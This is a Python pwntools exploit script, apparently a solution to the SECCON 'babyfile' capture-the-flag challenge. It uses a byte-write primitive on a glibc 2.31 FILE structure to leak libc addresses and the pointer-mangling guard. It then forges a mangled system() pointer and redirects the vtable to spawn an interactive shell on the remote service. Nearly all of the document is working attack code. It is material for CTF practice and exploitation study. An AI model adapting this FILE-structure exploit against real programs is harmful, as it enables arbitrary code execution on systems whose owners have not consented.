#!/usr/bin/env python3

from pwn import *

import time
from colored import fore, style

context.log_level = "error"

exe = ELF('chall')
libc = ELF('./libc-2.31.so')
ld = ELF('./ld-2.31.so')

context.binary = exe

based_offset = 0x1e8f60
canary_offset = 2045416 + 8
system_offset = 336528
binsh_offset = 0x1b45bd
cj = 2001440

args.LOCAL = 0
args.DEBUG = 0

aboba = 0x1000

def trick(p: process | remote, offset: int, data: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"offset: ", str(offset).encode())
    p.sendlineafter(b"value: ", str(data).encode())

def flush(p: process | remote):
    p.sendlineafter(b"> ", b"1")

#pon = 'b *(main + 267)\nb *(main + 63)\n'
pon = ''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            p = gdb.debug([exe.path], pon + """c\n""")
    else:
        p = remote("babyfile.seccon.games", 3157)

    return p

def pon_set(p, a, t):
    for i in range(8):
        trick(p, a + i, t % 256)
        t //= 256

def main():
    global aboba
    p = conn()
    start = time.time()
    trick(p, 0, 0)
    end = time.time()
    #print("ONE: ", end - start)
    trick(p, 1, 0)
    trick(p, 2, 0)
    trick(p, 3, 0)
    trick(p, 216, 0x18)
    trick(p, 217, 0x05)
    flush(p)
    trick(p, 16, 0x70)
    trick(p, 32, 0x70)
    trick(p, 216, 0xa0)
    trick(p, 217, 0x04)
    trick(p, 112, 2)
    flush(p)
    libc_leak = u64(p.recvuntil(b"Done")[:6] + b'\x00\x00')
    libc_based = libc_leak - 0x1e8f60
    canary_addr = libc_based + canary_offset - 0x80
    system_addr = libc_based + system_offset
    print("Libc leak: ", hex(libc_leak))
    print("Libc based: ", hex(libc_based))
    print("Canary addr: ", hex(canary_addr))
    print("System addr: ", hex(system_addr))
    pon_set(p, 32, canary_addr)
    pon_set(p, 40, canary_addr + 8)
    pon_set(p, 16, canary_addr)
    flush(p)
    sranary = u64(p.recvuntil(b"Done")[:8])
    #print()
    print(hex(aboba))
    print(f"{fore.CYAN}Sranary:{style.RESET}", hex(sranary), flush=True)

    unxor_system = system_addr ^ sranary

    rol = lambda val, r_bits, max_bits: \
        (val << r_bits%max_bits) & (2**max_bits-1) | \
        ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

    ror = lambda val, r_bits, max_bits: \
        ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
        (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

    unror_system = rol(unxor_system, 0x11, 64)
    print("PRIMAL ROAR:", hex(unror_system))
    pon_set(p, 240, unror_system)
    pon_set(p, 224, binsh_offset + libc_based - 0x100000000)
    pon_set(p, 216, libc_based + cj + 24)
    flush(p)
    p.interactive()
    aboba += 0x1000

if __name__ == "__main__":
    while 1:
        start = time.time()
        try:
            main()
        except Exception:
            pass
        end = time.time()
        print(end - start)
